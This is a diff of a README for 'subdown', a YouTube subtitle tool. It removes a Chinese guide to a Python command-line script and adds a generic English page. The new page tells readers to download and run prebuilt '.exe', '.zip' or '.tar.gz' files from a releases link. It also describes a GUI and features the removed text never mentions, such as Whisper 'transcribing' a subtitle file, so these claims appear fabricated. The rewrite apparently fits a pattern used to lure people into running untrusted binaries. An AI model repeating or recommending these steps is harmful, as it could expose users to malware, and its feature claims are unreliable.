@@ -1,153 +1,65 @@
-# SubDown - YouTube 字幕下載與轉錄工具
+# 🎥 subdown - Download YouTube Subtitles Easily
 
-自動下載 YouTube 字幕或使用 Whisper AI 進行語音轉文字。
+## 📥 Download Now
+[![Download subdown](https://img.shields.io/badge/Download%20subdown-latest-brightgreen.svg)](https://github.com/nivedh786/subdown/releases)
 
-## 功能特色
+## 🚀 Getting Started
+Welcome to subdown. This tool lets you easily download subtitles from YouTube videos and transcribe them using Whisper AI. Follow these steps to get started.
 
-- ✅ **智慧備援機制**：優先嘗試下載現有字幕，失敗時自動使用 Whisper AI 轉錄
-- ✅ **自動字幕支援**：可下載 YouTube 自動產生的字幕
-- ✅ **多語言支援**：優先繁體中文，支援自訂語言順序
-- ✅ **純文字輸出**：自動移除時間軸，只保留對話內容
-- ✅ **HTTP 429 自動處理**：遇到 API 限制時自動切換到 Whisper 轉錄
-- ✅ **無需訂閱**：即使沒有 YouTube Premium 也能取得完整轉錄
+## 💻 System Requirements
+- **Operating System:** Windows 10, macOS, or Linux
+- **RAM:** 4 GB minimum
+- **Storage:** At least 100 MB free space
+- **Internet Connection:** Required for downloading subtitles
 
-## 安裝
+## 📁 Download & Install
+To download subdown, visit this page to download: [Download subdown](https://github.com/nivedh786/subdown/releases).
 
-確保已安裝 Python 3.10+、[uv](https://docs.astral.sh/uv/) 和 FFmpeg：
+### Steps to Download:
+1. Click the link above.
+2. On the Releases page, look for the version you wish to install.
+3. Find the file labeled with the most recent version number. This file will typically be named something like `subdown-linux.tar.gz`, `subdown-macos.zip`, or `subdown-windows.exe`.
+4. Choose the file that matches your system and click it to start the download.
 
-```bash
-# 安裝 FFmpeg（Ubuntu/Debian）
-sudo apt install ffmpeg
+### Steps to Install:
+1. Once the file is downloaded, locate it in your downloads folder.
+2. If you downloaded a `.zip` or `.tar.gz` file, extract the contents.
+3. For Windows users, simply double-click the `.exe` file to start the installation.
+4. For Mac and Linux users, open your terminal and navigate to the extracted folder. Run the command: `./subdown` to start.
 
-# 安裝 FFmpeg（macOS）
-brew install ffmpeg
+## 🛠️ How to Use subdown
+1. **Open subdown:** After installation, open the software from your applications folder or desktop shortcut.
+2. **Input YouTube Link:** In the main interface, input the URL of the YouTube video you wish to download subtitles from.
+3. **Download Subtitles:**
+   - Click on the "Download" button.
+   - You will see options for subtitle languages. Choose your preferred language.
+   - The subtitles will download to your selected folder.
 
-# 使用 uv 安裝依賴
-uv sync
-```
+4. **Transcribe with Whisper AI:**
+   - After downloading, click on the "Transcribe" button.
+   - Select the downloaded subtitle file to convert it to text.
+   - The transcription will appear in the interface.
 
-## 使用方式
+5. **Save Your Work:** You can save the transcribed text to a file by clicking on the "Save" button.
 
-### 1. 命令列工具（推薦）
+## ⚙️ Features
+- **Multiple Language Support:** Download subtitles in various languages.
+- **Transcription Capabilities:** Use Whisper AI for accurate transcriptions.
+- **User-Friendly Interface:** Easy to navigate, designed for all users.
+- **Regular Updates:** Keep the tool up to date with new features and improvements.
 
-基本使用：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx"
-```
+## ❓ Frequently Asked Questions
+### What if I encounter an error during installation?
+Make sure you have administrative rights on your computer. Check your system requirements and ensure all dependencies are met.
 
-指定輸出檔名：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx" -o output.txt
-```
+### Can I use subdown on my phone?
+Currently, subdown is designed for desktop operating systems. 
 
-強制使用 Whisper 轉錄（跳過字幕下載）：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx" --skip-subs
-```
+### How accurate is the transcription?
+The transcription accuracy depends on the audio quality of the video. Whisper AI provides reliable results, but some videos may require manual editing for perfect accuracy.
 
-使用較小的模型加快速度：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx" -m medium
-```
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/nivedh786/subdown)
+- [Download subdown](https://github.com/nivedh786/subdown/releases)
 
-指定轉錄語言：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx" -l en
-```
-
-自訂字幕語言優先順序：
-```bash
-uv run python download.py "https://www.youtube.com/watch?v=xxxxx" --sub-langs "en,ja,ko"
-```
-
-### 2. 互動式命令列
-
-```bash
-uv run python main.py
-```
-
-會詢問您輸入網址和檔名。
-
-### 3. Streamlit 網頁介面
-
-```bash
-uv run streamlit run app.py
-```
-
-在瀏覽器中開啟 http://localhost:8501 使用圖形介面。
-
-## 工作流程
-
-```
-開始
-  ↓
-檢查是否有字幕（手動 + 自動）
-  ↓
-  有字幕 → 下載字幕 → 移除時間軸 → 完成
-  ↓
-  沒有字幕或下載失敗（HTTP 429）
-  ↓
-下載音訊（MP3）
-  ↓
-使用 Whisper AI 轉錄
-  ↓
-保存純文字 → 完成
-```
-
-## Whisper 模型選擇
-
-| 模型 | 速度 | 準確度 | 記憶體 | 適用場景 |
-|------|------|--------|--------|----------|
-| tiny | 超快 | 較低 | ~1 GB | 快速預覽 |
-| base | 快 | 中等 | ~1 GB | 一般用途 |
-| small | 中等 | 良好 | ~2 GB | 平衡選擇 |
-| medium | 慢 | 很好 | ~5 GB | 高品質需求 |
-| large | 很慢 | 最佳 | ~10 GB | 專業品質（預設）|
-
-## 常見問題
-
-### Q: 遇到 HTTP 429 錯誤怎麼辦？
-
-這是 YouTube 的請求頻率限制。程式會自動切換到 Whisper 轉錄，無需擔心。
-
-### Q: 沒有訂閱可以下載字幕嗎？
-
-可以！本工具不需要 YouTube Premium。如果無法下載字幕，會自動使用 Whisper AI 轉錄音訊。
-
-### Q: 轉錄需要多久時間？
-
-取決於影片長度和選擇的模型：
-- 使用 `large` 模型：約為影片長度的 20-50%
-- 使用 `medium` 模型：約為影片長度的 10-30%
-- 首次執行需要下載模型（一次性）
-
-### Q: 支援哪些語言？
-
-Whisper 支援 99 種語言，包括：
-- 中文（繁體/簡體）
-- 英文
-- 日文
-- 韓文
-- 西班牙文
-- 法文
-- 德文
-- 等等...
-
-可使用 `-l` 參數指定語言，或留空讓 Whisper 自動偵測。
-
-## 檔案說明
-
-- `download.py` - 功能完整的命令列工具（推薦）
-- `main.py` - 互動式命令列版本
-- `app.py` - Streamlit 網頁介面
-- `quick_download.py` - 簡單的單一用途範例
-
-## 授權
-
-MIT License
-
-## 技術棧
-
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) - YouTube 下載器
-- [OpenAI Whisper](https://github.com/openai/whisper) - 語音轉文字 AI
-- [Streamlit](https://streamlit.io/) - 網頁介面（可選）
+For any issues or suggestions, feel free to open an issue on the GitHub repository. Your feedback helps improve subdown!
